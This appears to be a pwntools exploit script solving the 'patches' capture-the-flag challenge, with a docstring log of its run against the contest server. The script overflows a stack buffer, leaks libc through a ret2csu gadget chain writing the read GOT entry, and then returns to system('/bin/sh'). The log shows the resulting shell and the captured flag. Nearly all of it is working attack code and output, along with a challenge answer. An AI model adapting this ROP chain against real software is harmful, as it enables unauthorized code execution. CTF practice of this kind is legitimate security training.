#!/usr/bin/python

from pwn import *

ELF_PATH = './patches'

elf  = ELF(ELF_PATH)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', 0)

gdbscript = '''
    b *0x00000000004011B5
'''

"""
$ python solver.py 31322
[*] '/home/abdullahnz/ctf/grimmcon/pwn/patches/patches'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.ctf.games on port 31322: Done
0x7fb3a62eb130
0x7fb3a61da000
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000 groups=1000
$ ls -l
total 48
drwxr-xr-x 1 root 0 12288 Dec 28 17:47 bin
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 dev
drwxr-xr-x 1 root 0  4096 Dec 28 17:47 etc
-r--r--r-- 1 root 0    39 Dec 28 17:46 flag.txt
lrwxrwxrwx 1 root 0     7 Dec 28 17:46 lib -> usr/lib
lrwxrwxrwx 1 root 0     9 Dec 28 17:46 lib32 -> usr/lib32
lrwxrwxrwx 1 root 0     9 Dec 28 17:46 lib64 -> usr/lib64
lrwxrwxrwx 1 root 0    10 Dec 28 17:46 libx32 -> usr/libx32
---x--x--x 1 root 0 16856 Dec 28 17:46 patches_revenge
drwxr-xr-x 1 root 0  4096 Dec 28 17:46 usr
$ cat flag.txt
flag{499c6288c77f297f4fd87db8e442e3f0}
$ ls 
bin
dev
etc
flag.txt
lib
lib32
lib64
libx32
patches_revenge
usr
$ 
[*] Interrupted
[*] Closed connection to challenge.ctf.games port 31322
"""

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    p = "a"*0x208
    p += p64(0x000000000040121A)
    p += p64(0x1) # rbx
    p += p64(0x2) # rbp
    p += p64(0x1) # r12
    p += p64(elf.got['read']) # r13
    p += p64(0x10) # r14
    p += p64(elf.got['write']-8) # r15
    p += p64(0x0000000000401200)
    p += p64(elf.sym['main'])*8

    debug(gdbscript)

    r.sendlineafter("> ", p)
    leak = u64(r.recv()[:8])
    libc.address = leak - libc.sym['read']

    print hex(leak)
    print hex(libc.address)

    p = "a"*0x208
    p += p64(libc.address + 0x0000000000026b72) # pop rdi ; ret
    p += p64(libc.search("/bin/sh").next())
    p += p64(libc.address + 0x0000000000026b73) #  ret
    p += p64(libc.sym['system'])

    r.sendlineafter("> ", p)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        libc = ELF("./libc.so.6", 0)
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)